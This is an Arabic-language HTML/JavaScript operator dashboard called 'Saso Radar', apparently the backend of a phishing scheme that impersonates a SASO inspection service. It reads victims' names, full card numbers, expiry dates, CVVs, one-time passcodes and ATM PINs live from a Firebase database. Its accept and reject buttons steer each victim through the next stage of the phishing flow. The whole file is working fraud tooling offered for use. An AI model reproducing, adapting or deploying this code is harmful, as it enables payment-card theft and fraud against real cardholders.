<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة تحكم الرادار الموحد</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    
    <style>
        :root { --main-green: #1e7344; --dark-bg: #0a0a0a; --accent: #ffd700; }
        body { font-family: 'Segoe UI', sans-serif; background: var(--dark-bg); color: #e0e0e0; margin: 0; padding: 10px; }
        
        .header { 
            background: #151515; padding: 15px 25px; display: flex; justify-content: space-between; 
            align-items: center; border-bottom: 3px solid var(--main-green); margin-bottom: 15px; border-radius: 10px;
        }

        .stats-box { display: flex; gap: 20px; align-items: center; }
        .live-indicator {
            background: rgba(46, 204, 113, 0.1); border: 1px solid #2ecc71;
            padding: 8px 15px; border-radius: 8px; color: #2ecc71; font-weight: bold;
            display: flex; align-items: center; gap: 8px;
        }
        .pulse { width: 10px; height: 10px; background: #2ecc71; border-radius: 50%; box-shadow: 0 0 8px #2ecc71; animation: pulse-animation 1.5s infinite; }
        @keyframes pulse-animation { 0% { transform: scale(0.9); opacity: 1; } 50% { transform: scale(1.2); opacity: 0.5; } 100% { transform: scale(0.9); opacity: 1; } }

        .table-container { width: 100%; overflow-x: auto; background: #151515; border-radius: 12px; }
        table { width: 100%; border-collapse: collapse; min-width: 1200px; }
        th { background: #202020; color: #999; padding: 15px; text-align: center; font-size: 13px; border-bottom: 2px solid #333; }
        td { padding: 12px; text-align: center; border-bottom: 1px solid #222; font-size: 15px; }
        
        /* حل مشكلة تشقلب رقم البطاقة */
        .card-num-cell { direction: ltr !important; unicode-bidi: bidi-override; font-family: 'Courier New', monospace; font-weight: bold; color: #fff; letter-spacing: 1px; }
        
        .page-name { color: var(--accent); font-size: 12px; font-weight: bold; background: #252525; padding: 4px 8px; border-radius: 4px; }
        .otp-val { color: #00ff88; font-size: 18px; font-weight: bold; }
        .pin-val { color: #ffeb3b; font-size: 18px; font-weight: bold; }

        .btn { padding: 10px 20px; border: none; border-radius: 6px; font-weight: bold; transition: 0.3s; cursor: pointer; font-size: 13px; }
        .btn-off { background: #333 !important; color: #666 !important; cursor: not-allowed; }
        .btn-accept.active { background: #2ecc71 !important; color: #fff; }
        .btn-reject.active { background: #e74c3c !important; color: #fff; }
    </style>
</head>
<body onload="_init()">

<audio id="alert_sound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>

<div class="header">
    <div class="stats-box">
        <strong style="font-size: 20px; color: var(--main-green);">Saso Radar</strong>
        <div class="live-indicator">
            <div class="pulse"></div>
            العملاء النشطون الآن: <span id="visitor_count" style="font-size: 20px; margin-right: 5px;">0</span>
        </div>
    </div>
    <button onclick="_clear()" style="background:#c0392b; color:white; border:none; padding:8px 15px; border-radius:5px; cursor:pointer;">تصفير السجلات</button>
</div>

<div class="table-container">
    <table>
        <thead>
            <tr>
                <th>#</th>
                <th>مكان العميل</th>
                <th>الاسم</th>
                <th>رقم البطاقة (من اليسار)</th>
                <th>التاريخ / CVV</th>
                <th>الرمز (OTP)</th>
                <th>ATM PIN</th>
                <th>الإجراء</th>
            </tr>
        </thead>
        <tbody id="monitor"></tbody>
    </table>
</div>

<script>
    const config = { databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/" };
    let cache = {};

    function _init() {
        if (!firebase.apps.length) firebase.initializeApp(config);
        const db = firebase.database();

        // تحديث عداد الزيارات الحية (Real-time)
        db.ref('orders').on('value', snap => {
            const data = snap.val() || {};
            const now = new Date().getTime();
            let active = 0;
            
            Object.values(data).forEach(item => {
                // لو العميل لسه فاتح أو حدث بياناته في آخر دقيقة
                if (item.last_update && (now - item.last_update < 60000)) active++;
            });
            document.getElementById('visitor_count').innerText = active;
        });

        // مراقبة العمليات
        db.ref('orders').on('value', snapshot => {
            const orders = snapshot.val() || {};
            const monitor = document.getElementById('monitor');
            monitor.innerHTML = '';
            const ids = Object.keys(orders).reverse();

            ids.forEach((id, index) => {
                const d = orders[id];
                const count = ids.length - index;

                // نظام التنبيه الصوتي
                const currentStr = JSON.stringify(d);
                let hasNewMove = false;
                if(cache[id] && cache[id] !== currentStr) {
                    document.getElementById('alert_sound').play().catch(()=>{});
                    hasNewMove = true;
                }
                cache[id] = currentStr;

                // تحديد المسار القادم
                let next = 'go_to_otp';
                if (d.otp_code || d.otp) next = 'go_to_pin';
                if (d.atm_pin) next = 'success';

                // حالة الزرار: ينور لو العميل مبعوت له أمر انتظار أو لسه باعت داتا
                const canAct = (d.next_step === 'waiting' || hasNewMove);
                const btnStyle = canAct ? 'active' : 'btn-off';

                const row = `
                    <tr>
                        <td>${count}</td>
                        <td><span class="page-name">${d.current_page || 'البداية'}</span></td>
                        <td style="font-weight:bold;">${d.fullName || '---'}</td>
                        <td class="card-num-cell">${d.cardNumber || '---'}</td>
                        <td>${d.expiryDate || '--/--'} | ${d.cvv || '---'}</td>
                        <td class="otp-val">${d.otp_code || d.otp || '----'}</td>
                        <td class="pin-val">${d.atm_pin || '----'}</td>
                        <td>
                            <button class="btn btn-accept ${btnStyle}" onclick="${canAct ? `_send('${id}', '${next}')` : ''}">قبول</button>
                            <button class="btn btn-reject ${btnStyle}" onclick="${canAct ? `_send('${id}', 'wrong_card')` : ''}">رفض</button>
                        </td>
                    </tr>
                `;
                monitor.insertAdjacentHTML('beforeend', row);
            });
        });
    }

    function _send(id, step) {
        firebase.database().ref('orders/' + id).update({ 
            next_step: step,
            last_command_time: new Date().getTime(),
            last_update: new Date().getTime() // عشان يفضل محسوب في الزيارات النشطة
        });
    }

    function _clear() {
        if(confirm("مسح كافة السجلات؟")) firebase.database().ref('orders').remove();
    }
</script>
</body>
</html>
